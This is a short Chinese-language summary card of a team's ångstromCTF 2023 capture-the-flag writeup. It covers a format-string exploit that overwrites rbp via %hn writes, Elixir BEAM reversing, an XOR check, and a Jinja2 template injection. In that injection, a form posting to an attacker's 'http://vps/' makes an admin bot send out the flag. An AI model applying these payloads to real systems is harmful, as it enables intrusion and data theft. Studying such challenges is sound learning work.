---
title: "ångstromCTF Writeup -VP-Union战队"
category: pwn
tags: ["ångstromCTF", "pwn", "fmt-string", "%*c-arbitrary-write", "jinja2-SSTI", "SVG-XSS"]
signals: ["ångstromCTF 2023", "fmt-string", "%*c-arbitrary-write", "jinja2-SSTI", "SVG-XSS", "erlang-bytecode", "Elixir-BEAM", "BEAM-amd64", "race-condition", "rop", "VP-Union", "ngstromCTF", "fmt", "rbp"]
difficulty: medium
source: "https://www.ctfiot.com/113827.html"
tools: ["Jinja2"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# ångstromCTF Writeup -VP-Union战队

> 赛事：ångstromCTF 2023 | 方向：pwn | 难度：medium | 工具：Jinja2

## 一句话总结

VP-Union 战队 ångstromCTF 2023 联合参赛 WP，复盖 fmt 字符串 %*c 改 rbp、Elixir BEAM 反编译、Jinja2 SSTI 等多元领域。

## 攻击链

1. PWN slack fmt 字符串 %25$p 泄栈 + %*Nc%25$hn 多次单字节写改 rbp 跳到 one_gadget/RE checkers XOR(anextremelycomplicatedkeythatisdefinitelyuselessss, [0x32,0x26...])/RE Bananas Elixir BEAM 字节码反汇编 Elixir.Bananas main/check/convert_input 函数还原/WEB brokenlogin 25 字节限制 + render_template_string(indexPage % custom_message) 注入 <form action=http://vps/ method=POST> 让 admin bot 提交带 flag 的表单

## 关键 payload

```
slack sla(b''Professional): '', (b''%'' + str((i + 3)&0xffff).encode() + b''c%25$hn'').ljust(0xd,b''a''))  # %*c 任意写
```

## 经验教训

fmt 字符串 %*c$hn 系列可实现任意地址单字节写；BEAM 字节码通过 .beam 头部 Module: + Attributes: + Compilation Info: + //Function 区块手工反汇编；Jinja2 `render_template_string(page % custom_message)` 中 % 用户可控可注入。

## 标签

fmt-string、%*c-arbitrary-write、jinja2-SSTI、SVG-XSS、erlang-bytecode、Elixir-BEAM、BEAM-amd64、race-condition、XOR

## 参考来源

- https://www.ctfiot.com/113827.html
- 原文件：ångstromCTF_Writeup_-VP-Union战队.full.md
